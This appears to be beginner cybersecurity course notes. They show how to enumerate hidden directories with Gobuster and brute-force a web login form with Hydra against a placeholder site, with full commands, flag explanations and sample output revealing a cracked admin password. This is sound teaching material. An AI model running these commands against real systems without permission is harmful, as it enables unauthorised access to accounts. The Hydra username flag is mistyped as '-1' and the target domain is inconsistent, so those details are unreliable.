# Pre Security
## Introduction to Cyber Security
### Finding private pages on a website

Hidden pages may be attempted manually: `http://www.testwebsite.com/PAGE_TITLE` or using an automated tool: **Gobuster**

#### Using Gobuster
```bash
gobuster dir --url http://www.testwebsite.com/ -w /usr/share/wordlists/dirbuster/directory-list.txt
```

- `gobuster` - terminal command to start Gobuster
- `dir` - uses directory & file enumeration mod
- `--url http://www.testwebsite.com/` - target website
- `-w /usr/share/wordlists/dirbuster/directory-list.txt` - word list to use

Output:
```bash
/login (Status: 301) [Size: 314] [-->http://www.testwebsite.com/login/]
```

### Logging in via User & Pass

Logging in can be done manually using commonly used user/pass combinations:

*Username: admin*   
*Password: password*

...or an automated tool, **Hydra**

#### Running Hydra
```bash
hydra -1 admin -P passlist.txt www.testwebsite.com http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
```

- `hydra` - command to start Hydra
- `-1 admin` - attempts to login w/ `admin` username
- `-P passlist.txt` - password list 
- `www.testwebsite.thm` - sets target website
- `http-post-form` - indicates this is an HTTP POST request form
- `"/login:username=^USER^&password=^PASS^:F=incorrect"` - specifies shape of HTTP POST request & how to check if login credentials are incorrect
- `-V` - used for verbose output

Output:
```bash
[80][http-post-form] host:www.testwebsite.com login: admin password: qwerty
```